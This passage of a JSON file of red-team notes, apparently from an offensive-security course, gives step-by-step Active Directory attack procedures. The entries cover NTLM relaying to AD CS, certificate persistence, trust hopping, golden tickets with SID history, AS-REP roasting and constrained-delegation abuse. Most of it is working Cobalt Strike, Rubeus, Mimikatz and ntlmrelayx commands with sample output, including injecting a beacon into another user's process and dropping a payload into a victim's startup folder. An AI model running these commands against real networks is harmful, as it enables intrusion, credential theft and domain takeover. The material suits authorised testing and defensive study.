CERTIFICATE-----\nMIIGKzCCBROgAwIBAgITIQAAAAJ1qRjA3m3TOAAAAAAAAjANBgkqhkiG9w0BAQsF\n[...snip...]\nXm58FnNpAvwXQi1Vu+xIdtpRSGsnl6T6/TYwJlhKqMEU9mRfgaWXgLS+HdS++aw=\n-----END CERTIFICATE-----\n\n[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n\nCertify completed in 00:00:16.3844085\n``````\n\n## Request certificate for machine\nThe `/machine` parameter tells Certify to auto-elevate to SYSTEM and assume the identity of the machine account (for which you need to be running in high-integrity).\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe request /ca:dc-2.edu.evil.corp\\ca-2 /template:Machine /machine\n``````"
        ],
        "tools": [
            "Certify"
        ],
        "steps": []
    },
    {
        "id": "bd1d373b-7444-468b-bc50-42cda4767d46",
        "name": "NTLM Relaying to ADCS",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# NTLM Relaying to ADCS\nAD CS services support HTTP enrolment methods via `http[s]://<host>/certsrv`, and by default supports `NTLM` and `Negotiate` authentication methods.\n ![](/Images/Pasted%20image%2020220316233059.png)\n\nBy default, these endpoints can be misused for an NTLM relaying attack.\nThe idea is:\n1. Domain controller authenticates to an attacker-controller location\n2. Relay that request to the CA and obtain a certificate for that DC\n3. Use it to obtain a TGT.\n\n\u26a0\ufe0f You cannot relay authentication back to the original machine. \nIf the CA is also on the DC you cannot request a certificate for dc-1.\nInstead, we'll use WKSTN3 as an example.\n\nSetup:\n* 10.10.5.10 is DC-1\n* 10.10.5.20 is SRV1\n* 10.10.5.30 is WKSTN3\n\nAs SYSTEM on SRV1:\n1. Use PortBender to capture incoming traffic on port 445 and redirect it to port 8445.\n2. Start a reverse port forward to forward port 8445 to the CS server on port 445.\n3.  Start a SOCKS proxy for ntlmrelayx to send traffic back into the network.\n    ```beacon\n    beacon> PortBender redirect 445 8445\n    [+] Launching PortBender module using reflective DLL injection\n    \n    Initializing PortBender in redirector mode\n    Configuring redirection of connections targeting 445/TCP to 8445/TCP\n\n    beacon> rportfwd 8445 127.0.0.1 445\n    [+] started reverse port forward on 8445 to 127.0.0.1:445\n\n    beacon> socks 1080\n    [+] started SOCKS4a server on: 1080\n    ```\n\n4. Start ntlmrelayx over proxychains and target dc-1:\n    ```sh\n    proxychains ntlmrelayx.py -t http://10.10.5.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server\n    ```\n\n5. Force a connection from WKSTN3 to SRV1.\n    ```beacon\n    beacon> execute-assembly C:\\Tools\\SpoolSample\\SpoolSample\\bin\\Debug\\SpoolSample.exe 10.10.5.30 10.10.5.20\n\n    [+] Converted DLL to shellcode\n    [+] Executing RDI\n    [+] Calling exported function\n    ```\n\n6. We see the connection in the Beacon running PortBender.\n    ```beacon\n    [+] received output:\n    New connection from 10.10.5.30:53666 to 10.10.5.20:445\n    Disconnect from 10.10.5.30:53666 to 10.10.5.20:445\n    ```\n\n7. We receive a base64 encoded ticket.\n    ```sh\n    [*] SMBD-Thread-4: Connection from EDU/WKSTN-3$@127.0.0.1 controlled, attacking target http://10.10.5.10\n    [*] HTTP server returned error code 200, treating as a successful login\n    [*] Authenticating against http://10.10.5.10 as EDU/WKSTN-3$ SUCCEED\n    [*] Generating CSR...\n    [*] CSR generated!\n    [*] Getting certificate...\n    ...  OK\n    [*] Authenticating against http://10.10.5.10 as EDU/WKSTN-3$ SUCCEED\n    [*] SMBD-Thread-4: Connection from EDU/WKSTN-3$@127.0.0.1 controlled, attacking target http://10.10.5.10\n    [*] Authenticating against http://10.10.5.10 as EDU/WKSTN-3$ SUCCEED\n    [*] Authenticating against http://10.10.5.10 as EDU/WKSTN-3$ SUCCEED\n    [*] Authenticating against http://10.10.5.10 as EDU/WKSTN-3$ SUCCEED\n    [*] GOT CERTIFICATE! ID 5\n    [*] Base64 certificate of user WKSTN-3$:\n    MBCQ4Y[...snip...]Mndq==\n    ```\n\n8. Use [[S4U2self Abuse#Obtain a TGS to itself]] to obtain a TGS for any service on the machine, on behalf of any user. \n\n\n## Tools\n########\n########",
        "category": "Active Directory Certificate Service",
        "stealthy": false,
        "changes": [
            "\n## [[PrintSpooler]]\n",
            "\n## [[SharpSystemTriggers]]\nMethods available:\n| Method | Description | Img |\n| ------ | ----------- | --- |\n|SharpEfsTrigger| MS-EFS RPC| ![](https://github.com/cube0x0/SharpSystemTriggers/raw/main/Images/efs.png) |\n|SharpSpoolTrigger| MS-RPRN RPC | ![](https://github.com/cube0x0/SharpSystemTriggers/raw/main/Images/spool.png) |\n|SharpDcomTrigger| DCOM Potato | ![](https://github.com/cube0x0/SharpSystemTriggers/raw/main/Images/dcom.png) |"
        ],
        "tools": [
            "MultiRelay",
            "PrintSpooler",
            "SharpSystemTriggers"
        ],
        "steps": []
    },
    {
        "id": "25fc756b-f066-4049-a640-d8edc8389a85",
        "name": "User & Computer Persistence",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# User & Computer Persistence\n## User Persistence\n1. Find all the certificates that permit client authentication [[Certify#Find all certificates that permit client auth]]\n![aa](/Images/Pasted%20image%2020220316235553.png)\n\n2. Request a certificate [[Certify#Request certificate for user]]\n3. Request TGT for user using [[Rubeus#Ask TGT via certificate]]\n\n## Computer Persistence\nThe default template for computers is called `Machine` (the template display name is `Computer`).\n\n\n## Tools\n########\n########",
        "category": "Active Directory Certificate Service",
        "stealthy": false,
        "changes": [
            "\n## [[Certify]]\nFind all certificates that permit client auth\nTo limit the volume of output, we can only return templates from the CA in our current domain, using `/ca:dc-2.edu.evil.corp\\ca-2`\n\nRequirements (default):\n- Authorized Signatures Required: `0`\n- Enrollment Rights: `domain\\Domain Users`\n- Validity Period: `1 year`\n\n``````\nbeacon> getuid\n[*] You are EDU\\patrick\n\nbeacon> execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe find /clientauth\n``````"
        ],
        "tools": [
            "Certify"
        ],
        "steps": []
    },
    {
        "id": "a710ffb5-b4c0-42c0-b382-2a6ec1617b74",
        "name": "One-Way (Inbound)",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# One-Way (Inbound)\n\nedu.evil.corp has a one-way inbound trust with evil.external.\n```beacon\nbeacon> powershell Get-DomainTrust\n\nSourceName      : edu.evil.corp\nTargetName      : evil.external\nTrustType       : WINDOWS-ACTIVE_DIRECTORY\nTrustAttributes : \nTrustDirection  : Inbound\nWhenCreated     : 3/10/2022 10:13:25 PM\nWhenChanged     : 3/10/2022 10:13:25 PM\n```\n\nInbound means, that principals in our domain can be granted access to resources in the external domain.\n\n## Jump the forest\n\u26a0 In order to access the domain you need to impersonate a user from this domain\n\n### Create inter-realm key\n1. Create TGT for the principal in question\n      ```beacon\n      beacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgt /user:jonas /domain:edu.evil.corp /aes256:891[..snip..]7c41 /opsec /nowrap\n\n      [*] Action: Ask TGT\n      [*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n      [*] Using aes256-cts-hmac_sha1 hash: 891[..snip..]7c41\n      [*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\jonas'\n      [+] TGT request successful!\n      [*] base64(ticket.kirbi):\n\n            doIFdD [...snip...] MuSU8=\n      ```\n\n2. Create a referal ticket\n      ```beacon\n      beacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgs /service:krbtgt/evil.external /domain:edu.evil.corp /dc:dc-2.edu.evil.corp /ticket:doIFdD[...snip...]MuSU8= /nowrap\n\n      [*] Action: Ask TGS\n      [*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n      [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket\n      [*] Building TGS-REQ request for: 'krbtgt/evil.external'\n      [+] TGS request successful!\n      [*] base64(ticket.kirbi):\n\n            doIFMT [...snip...] 5BTA==\n      ```\n\n3. Request TGS in target domain with inter-realm TGT\n      ```beacon\n      beacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgs /service:cifs/ad.evil.external /domain:ad.evil.external /dc:ad.evil.external /ticket:doIFMT[...snip...]5BTA== /nowrap\n\n      [*] Action: Ask TGS\n      [*] Using domain controller: ad.evil.external (10.10.14.55)\n      [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket\n      [*] Building TGS-REQ request for: 'cifs/ad.evil.external'\n      [+] TGS request successful!\n      [+] Ticket successfully imported!\n      [*] base64(ticket.kirbi):\n\n            doIFsD [...snip...] JuYWw=\n      ```\n\n4. Store to a file\n      > [System.IO.File]::WriteAllBytes(\"C:\\Users\\Administrator\\Desktop\\external.kirbi\", [System.Convert]::FromBase64String(\"doIFiD [...snip...] 5hbA==\"))\n\n5. [[Use Kerberos ticket (kirbi)]]\n\n## Tools\n########\n########",
        "category": "Forest & Domain Trusts",
        "stealthy": false,
        "changes": [
            "\n## [[PowerView]]\n```powershell\nGet-DomainTrust                     #returns all domain trusts for the current domain or a specified domain\nGet-ForestTrust                     #returns all forest trusts for the current forest or a specified forest\nGet-DomainForeignUser               #enumerates users who are in groups outside of the user's domain\nGet-DomainForeignGroupMember        #enumerates groups with users outside of the group's domain and returns each foreign member\nGet-DomainTrustMapping              #this function enumerates all trusts for the current domain and then enumerates all trusts for each domain it finds\n```\n\n[POWERVIEW - MANUAL](https://powersploit.readthedocs.io/en/latest/Recon/)",
            "\n## [[SharpHound]]\nGet Trust of domain\n>SharpHound -c Trusts -d evil.external"
        ],
        "tools": [
            "PowerView",
            "SharpHound"
        ],
        "steps": []
    },
    {
        "id": "263ba019-a0e0-4591-a36a-1a413372b742",
        "name": "One-Way (Outbound)",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# One-Way (Outbound)\nThis can be a difficult trust to exploit.\nIdea:\n* Domain A trusts Domain B\n* Domain B can access Domain A\n* Domain A can not access Domain B.\n\nTechniques:\n* SQL Server link created in the opposite direction of the domain trust (see [[MS SQL Servers]]).\n* RDP drive sharing (or RDPInception).  \nWhen a user enables drive sharing for their RDP session, it mounts a folder on the target machine that maps back to their local machine. If the target machine is compromised, we may migrate into the user's RDP session and use this mount-point to write files directly onto the machine. This is useful for dropping payloads into their startup folder which would be executed the next time they logon.\n\nWe are here: evil.corp\nTarget: get to evil.external\nOur domain trusts their domain (outbound)\n\nevil.corp has an outbound trust with evil.external.\n```beacon\nbeacon> powershell Get-DomainTrust -Domain evil.corp\n\nSourceName      : evil.corp\nTargetName      : evil.external\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : FOREST_TRANSITIVE\nTrustDirection  : Outbound\nWhenCreated     : 2/19/2022 10:15:24 PM\nWhenChanged     : 2/19/2022 10:15:24 PM\n```\n\nSince outbound is defined, enumeration of the foreign domain will fail:\n>Exception calling \"FindAll\" with \"0\" argument(s): \"A referral was returned from the server.\n\n1. **The strategy is to find principals in our `evil.corp` domain that are from our target domain `evil.external`.**\n[[PowerView#Get Groups containing users outside of this domain]]\n\nThis shows us that there's a domain group in `evil.corp` called `Jump Users`, which contains principals that are not from `evil.corp`. These `ForeignSecurityPrincipals` are like aliases, and can't be resolved like `ConvertFrom-SID` to find out what that principal actually is.\n\n2. Move laterally to instances where members of the `Jump Users` group have privileged access (local admins, RDP/WinRM/DCOM access etc).\n- `First Degree RDP Privileges` ([[BloodHound]])\n- [[PowerView#Machines that have identity assigned to a target group]]\n4. Camp there until you see a member authenticate. Then, impersonate them to hop the trust.\n```beacon\nbeacon> getuid\n[*] You are NT AUTHORITY\\SYSTEM (admin)\n\nbeacon> run hostname\nsql1\n\nbeacon> net logons\nLogged on users at \\\\localhost:\n\nDEV\\michael\nEDU\\SQL-1$\n\nbeacon> shell netstat -anop tcp | findstr 3389\n  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1012\n  TCP    10.10.15.90:3389       10.10.18.221:50145     ESTABLISHED     1012\n\nbeacon> ps\n PID   PPID  Name                         Arch  Session     User\n ---   ----  ----                         ----  -------     -----\n 644   776   ShellExperienceHost.exe      x64   3           DEV\\michael\n 4960  1012  rdpclip.exe                  x64   3           DEV\\michael\n 4980  696   svchost.exe                  x64   3           DEV\\michael\n \nbeacon> portscan 10.10.18.0/24 139,445,3389,5985 none 1024\n10.10.18.221:3389\n10.10.18.221:5985\n\n10.10.18.167:139\n10.10.18.167:445\n10.10.18.167:3389\n10.10.18.167:5985\n\nScanner module is complete\n```\n5. Inject a beacon into his process\n```beacon\nbeacon> inject 4960 x64 tcp-local\n[+] established link to child beacon: 10.10.15.90\n\nbeacon> getuid\n[*] You are DEV\\michael\n\nbeacon> powershell Get-Domain\nForest                  : evil.external\nDomainControllers       : {dc-01.evil.external}\n```\n6. Check permissions of the use:\n   We didn't see port 445 open, so we can't do anything over file shares, but 5985. Since the firewall is active we use a privot listener or open a port via [[Set windows firewall rule]].\n```beacon\nbeacon> remote-exec winrm sql01.evil.external whoami; hostname\n\nDEV\\michael\nsql01\n\nbeacon> jump winrm64 sql01.evil.external pivot-sql1\n[+] established link to child beacon: 10.10.18.221\n```\n7. If **no** admin try to hijack the RDP drive sharing\n   Inside the RDP session on SQL-1, there's a UNC path called `tsclient` which has a mount point for every drive that is being shared over RDP. `\\\\tsclient\\c` is the C: drive on the origin machine of the RDP session, in this case `sql01.evil.external`. This gives us the equivalent of standard user read/write access to that drive.\n8. Drop binary into startup\n```beacon\nbeacon> cd \\\\tsclient\\c\\Users\\michael\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\nbeacon> upload C:\\Payloads\\pivot.exe\nbeacon> ls\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n 174b     fil     05/15/2022 19:00:25   desktop.ini\n 281kb    fil     05/15/2022 20:31:00   pivot.exe\n```\n\n\n## Tools\n########\n########",
        "category": "Forest & Domain Trusts",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "173b106f-26bc-486f-bf47-5fe61df5db6d",
        "name": "Parent-Child",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Parent - Child\nWhen a child domain is added to a forest, it automatically creates a transitive, two-way trust with its parent. This be found in the lab where edu.evil.corp is a child domain of evil.corp.\n\n```beacon\nbeacon> powershell Get-DomainTrust\n\nSourceName      : edu.evil.corp\t\t\t//current domain\nTargetName      : evil.corp\t\t\t\t//foreign domain\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : WITHIN_FOREST\t\t\t\t//parent/child domain\nTrustDirection  : Bidirectional\t\t\t\t//bidirectional/two-way, One-way trust)\nWhenCreated     : 2/19/2022 1:28:00 PM\nWhenChanged     : 2/19/2022 1:28:00 PM\n```\n\n| Trust type | Transitivity                | Direction          | Description                                                                                                                                    |\n| ---------- | --------------------------- | ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------- |\n| External   | Nontransitive               | One-way or two-way | Provide access to resources that are located on a domain that is located in a separate non joined forest.                                      |\n| Realm      | Transitive or nontransitive | One-way or two-way | Form a trust relationship between a non-Windows Kerberos realm and a Windows Server 2008                                                       |\n| Forest     | Transitive                  | One-way or two-way | Share resources between forests. Two-way trust: authentication requests can reach the other forest.                                            |\n| Shortcut   | Transitive                  | One-way or two-way | Improve user logon times between two domains within a Windows Server forest. This is useful when two domains are separated by two domain trees |\n\nIf we have Domain Admin privileges in the child, we can also gain Domain Admin privileges in the parent using Golden Ticket with a special attribute called SID History.  So when creating a Golden Ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added to the SID history which will grant access to all resources in the parent.\n\nIf edu.evil.corp also had a child (e.g. test.edu.evil.corp), then a DA in TEST would be able to use their krbtgt to hop to DA/EA in evil.corp instantly because the trusts are transitive.\n\nThere are also other means which do not require DA in the child, some of which we've already seen. You can also [[Kerberoasting]] and [[AS-REP Roasting]] across domain trusts, which may lead to privileged credential disclosure. Because principals in EDU can be granted access to resources in EDU, you may find instances where they are accessing machines we have compromised. If they interact with a machine with [[Unconstrained Delegation]], we can capture their TGTs. If they're on a machine interactively, e.g. over RDP, we can impersonate them just like any other user.\n\n## Tools\n########\n########",
        "category": "Forest & Domain Trusts",
        "stealthy": false,
        "changes": [
            "\n## [[Mimikatz]]\nrevert via:\n>beacon> rev2self\n\n### Create golden ticket ParentChild\n```beacon\npowershell Get-DomainGroup -Identity \"Domain Admins\" -Domain rto.local -Properties ObjectSid\nobjectsid                                    \n---------                                    \nS-1-5-21-2323903455-1895497758-3703895482-512\n\npowershell Get-DomainGroup -Identity \"Domain Admins\" -Domain child.rto.local -Properties ObjectSid\nobjectsid                                   \n---------                                   \nS-1-5-21-1886337448-2504686659-850325809-512\n\nhashdump\nor\nmimikatz lsadump::dcsync /user:CHILD\\krbtgt /domain:child.rto.local\naes256_hmac       (4096) : 0c5f44579dd7cd99796e0ca64506184e2779d4ab96690ac042a80e1d29097477\n```\n\n-   `/user` is the username to impersonate.\n-   `/domain` is the current domain.\n-   `/sid` is the current domain SID.\n-   `/sids` is the SID of the target group to add ourselves to.\n-   `/aes256` is the AES256 key of the current domain's krbtgt account.\n-   `/startoffset` sets the start time of the ticket to 10 mins before the current time.\n-   `/endin` sets the expiry date for the ticket to 60 mins.\n-   `/renewmax` sets how long the ticket can be valid for if renewed.\n\n```beacon\nmimikatz kerberos::golden /user:Administrator /domain:child.rto.local /sid:S-1-5-21-1886337448-2504686659-850325809-512 /sids:S-1-5-21-2323903455-1895497758-3703895482-512 /aes256:0c5f44579dd7cd99796e0ca64506184e2779d4ab96690ac042a80e1d29097477 /startoffset:-10 /endin:600 /renewmax:10080\n```"
        ],
        "tools": [
            "Mimikatz"
        ],
        "steps": []
    },
    {
        "id": "181f1d39-4552-41c0-b5d3-ee9f670422ea",
        "name": "AS-REP Roasting",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1558.004",
        "external": false,
        "description": "NoDescription",
        "content": "# AS-RER Roasting\nIf a user does not have [[Kerberos]] pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline to recover their plaintext password.\n\n ![](/Images/AS-REP Roast.png)\n\nProcess:\n1. [[BloodHound#AS-REP Roasting]]\n2. [[ADSearch#Identify as-rep roastable user]]\n3. [[Hashcat#Cracking krb5asrep]]\n\n## Tools\n########\n########",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [
            "\n## [[ADSearch]]\nIdentify AS-Reproastable user\n``````beacon\nbeacon> execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Debug\\ADSearch.exe --search \"(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" --attributes cn,distinguishedname,samaccountname\n\n[*] No domain supplied. This PC's domain will be used instead\n[*] LDAP://DC=edu,DC=evil,DC=corp\n[*] CUSTOM SEARCH: \n[*] TOTAL NUMBER OF SEARCH RESULTS: 1\n [+] cn                : Oracle Service\n [+] distinguishedname : CN=Oracle Service,CN=Users,DC=edu,DC=evil,DC=corp\n [+] samaccountname    : svc_oracle\n``````",
            "\n## [[BloodHound]]\n- AS-REP roastable users\n>MATCH (u:User {dontreqpreauth:true}) RETURN u",
            "\n## [[Rubeus]]\n1. Identify users: [[ADSearch#Identify as-rep roastable user]]\n2. [[AS-REP Roasting]]\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asreproast /user:svc_oracle /nowrap\n\n[*] Action: AS-REP roasting\n\n[*] Target User            : svc_oracle\n[*] Target Domain          : edu.evil.corp\n\n[*] Searching path 'LDAP://dc-2.edu.evil.corp/DC=edu,DC=evil,DC=corp' for AS-REP roastable users\n[*] SamAccountName         : svc_oracle\n[*] DistinguishedName      : CN=Oracle Service,CN=Users,DC=edu,DC=evil,DC=corp\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Building AS-REQ (w/o preauth) for: 'edu.evil.corp\\svc_oracle'\n[+] AS-REQ w/o preauth successful!\n[*] AS-REP hash:\n\n $krb5asrep$svc_oracle@edu.evil.corp:F3B1A1 [...snip...] D6D049\n``````\n3. Cracking with [[Hashcat#Cracking krb5asrep]]"
        ],
        "tools": [
            "ADSearch",
            "BloodHound",
            "Rubeus"
        ],
        "steps": []
    },
    {
        "id": "f9407c6e-dadb-4405-8565-b4111a0f2f34",
        "name": "Constrained Delegation",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Constrained Delegation\nMore secure method of [[Unconstrained Delegation]].\nTGTs of users are no longer cached, but it allows to request a TGS for another user with its own TGT.\n ![](/Images/Pasted%20image%2020220316164953.png)\n\nIt can only act on behalf of a user to the **cifs** service on **WKSTN2**. With CIFS file shares can be listed, files can be uploaded and downloaded, and the Service Control Manager ([[PsExec]]) can be controlled.\n\nTo perform the delegation, we need TGT of the principal (machine or user) trusted for delegation. We can extract:\n- from a machine (`Rubeus dump`) \n- using the NTLM / AES keys and ask for the TGT ([[eKeys]] + [[Rubeus#Request TGT and inject into sacrificial process]]).\n\n\n## Alternate Service Name\nEven if the service for a specific workstation is not usefull, it can be changed via `/altservice` in [[Rubeus]] since its not being validated in s4u.\n\n\n## Tools\n########\n########",
        "category": "Kerberos",
        "stealthy": false,
        "changes": [
            "\n## [[ADSearch]]\nIdentify constrained delegation\n[[PowerView#Constrained Delegation]]\nFind all computers configured for constrained delegation and what they're allowed to delegate to (we need the `--json` output to drill down into the `msds-allowedtodelegateto` attribute).\n``````beacon\nbeacon> execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Debug\\ADSearch.exe --search \"(&(objectCategory=computer)(msds-allowedtodelegateto=*))\" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json\n\n[*] No domain supplied. This PC's domain will be used instead\n[*] LDAP://DC=edu,DC=evil,DC=corp\n[*] CUSTOM SEARCH: \n[*] TOTAL NUMBER OF SEARCH RESULTS: 1\n[\n  {\n \"cn\": \"SRV2\",\n \"dnshostname\": \"srv2.edu.evil.corp\",\n \"samaccountname\": \"SRV2$\",\n \"msds-allowedtodelegateto\": [\n \"eventlog/dc-2.edu.evil.corp/edu.evil.corp\",\n \"eventlog/dc-2.edu.evil.corp\",\n \"eventlog/DC-2\",\n \"eventlog/dc-2.edu.evil.corp/EDU\",\n \"eventlog/DC-2/EDU\",\n \"cifs/wkstn2.edu.evil.corp\",\n \"cifs/WKSTN2\"\n ]\n  }\n]\n``````",
            "\n## [[BloodHound]]\n\u2139\ufe0f Constrained delegation can be configured on user accounts as well as computer accounts.  Make sure you search for both.\n>MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p",
            "\n## [[PowerView]]\n> powerpick Get-DomainComputer -TrustedToAuth powerpick Get-DomainUser -TrustedToAuth",
            "\n## [[Rubeus]]\nRequire Admin\n1. Gather computer aes256 hash via [[eKeys]]\n2. Automatically request TGS for specific service\nWhere:\n- `/impersonateuser` is the user we want to impersonate. `patrick` is a domain admin but you want to ensure this user has local admin access to the target (WKSTN2).\n- `/msdsspn` is the service principal name that SRV2 is allowed to delegate to.\n- `/user` is the principal allowed to perform the delegation.\n- `/aes256` is the AES256 key of the `/user`.\n- `/opsec` tells Rubeus to more closely mimic genuine S4U2Self and S4U2Proxy requests (can only be used with `aes256`).\n- `/ptt` [[Pass-the-Ticket]], tells Rubeus to pass the generated tickets directly into the current logon session.\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe s4u /impersonateuser:patrick /msdsspn:cifs/wkstn2.edu.evil.corp /user:srv2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt\n\n[*] Action: S4U\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Using aes256_cts_hmac_sha1 hash: 952891c9933c675cbbc2186f10e934ddd85ab3abc3f4d2fc2f7e74fcdd01239d\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\srv2$'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n doIFLD [...snip...] MuSU8=\n\n[*] Action: S4U\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Building S4U2self request for: 'SRV2$@edu.evil.corp'\n[+] Sequence number is: 1703507608\n[*] Sending S4U2self request\n[+] S4U2self success!\n[*] Got a TGS for 'patrick' to 'SRV2$@edu.evil.corp'\n[*] base64(ticket.kirbi):\n\n doIFfj [...snip...] JWLTIk\n\n[*] Impersonating user 'patrick' to target SPN 'cifs/wkstn2.edu.evil.corp'\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Building S4U2proxy request for service: 'cifs/wkstn2.edu.evil.corp'\n[+] Sequence number is: 326551889\n[*] Sending S4U2proxy request\n[+] S4U2proxy success!\n[*] base64(ticket.kirbi) for SPN 'cifs/wkstn2.edu.evil.corp':\n\n doIGwj [..snip...] ljLmlv\n\n[+] Ticket successfully imported!\n\nbeacon> ls \\\\wkstn2.edu.evil.corp\\c$\n  \n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/19/2022 14:35:19   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n``````\n\n## Alternate Service Name\nThis is an special case of [[Constrained Delegation]], were the service is not useful.\nWe can request a TGS for any service run by DC-2, using `/altservice` flag in Rubeus.\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.edu.evil.corp /altservice:cifs /user:srv2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt\n\n[*] Action: S4U\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Using aes256-cts-hmac-sha1 hash: 952891c9933c675cbbc2186f10e934ddd85ab3abc3f4d2fc2f7e74fcdd01239d\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\srv2$'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n doIFLD [...snip...] MuSU8=\n\n[*] Action: S4U\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Building S4U2self request for: 'SRV2$@edu.evil.corp'\n[+] Sequence number is: 1421721239\n[*] Sending S4U2self request\n[+] S4U2self success!\n[*] Got a TGS for 'Administrator' to 'SRV2$@edu.evil.corp'\n[*] base64(ticket.kirbi):\n\n doIFfj [...snip...] WLTIk\n\n[*] Impersonating user 'Administrator' to target SPN 'eventlog/dc-2.edu.evil.corp'\n[*]   Final tickets will be for the alternate services 'cifs'\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Building S4U2proxy request for service: 'eventlog/dc-2.edu.evil.corp'\n[+] Sequence number is: 1070349348\n[*] Sending S4U2proxy request\n[+] S4U2proxy success!\n[*] Substituting alternative service name 'cifs'\n[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.edu.evil.corp':\n\n doIGvD [...snip...] ljLmlv\n\n[+] Ticket successfully imported!\n\nbeacon> ls \\\\dc-2.edu.evil.corp\\c$\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/10/2022 04:11:30   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n ``````\n\n## Check stored TGT\nUse `Rubeus describe` to show information about the ticket.\n``````beacon\nexecute-assembly Rubeus.exe describe /ticket:C:\\Users\\Administrator\\Desktop\\wkstn2-s4u.kirbi\n\n[*] Action: Describe Ticket\n\n  ServiceName              :  WKSTN2$\n  ServiceRealm             :  edu.evil.corp\n  UserName                 :  patrick\n  UserRealm                :  edu.evil.corp\n  StartTime                :  2/28/2022 7:30:02 PM\n  EndTime                  :  3/1/2022 5:19:32 AM\n  RenewTill                :  1/1/0001 12:00:00 AM\n  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable\n  KeyType                  :  aes256_cts_hmac_sha1\n  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=\n``````\n\n## Ask TGT via certificate\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgt /user:nglover /certificate:MIIM5wIBAz[...snip...]dPAgIIAA== /password:password /aes256 /nowrap\n\n[*] Action: Ask TGT\n\n[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=Isabel Yates, CN=Users, DC=evil, DC=corp \n[*] Building AS-REQ (w/ PKINIT preauth) for: 'evil.corp\\nglover'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n doIGNjCCB[...snip...]pYy5pbw==\n\n  ServiceName              :  krbtgt/evil.corp\n  ServiceRealm             :  EVIL.CORP\n  UserName                 :  nglover\n  UserRealm                :  EVIL.CORP\n  StartTime                :  1/18/2022 4:38:26 PM\n  EndTime                  :  1/19/2022 2:38:26 AM\n  RenewTill                :  1/25/2022 4:38:26 PM\n  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType                  :  aes256_cts_hmac_sha1\n  Base64(key)              :  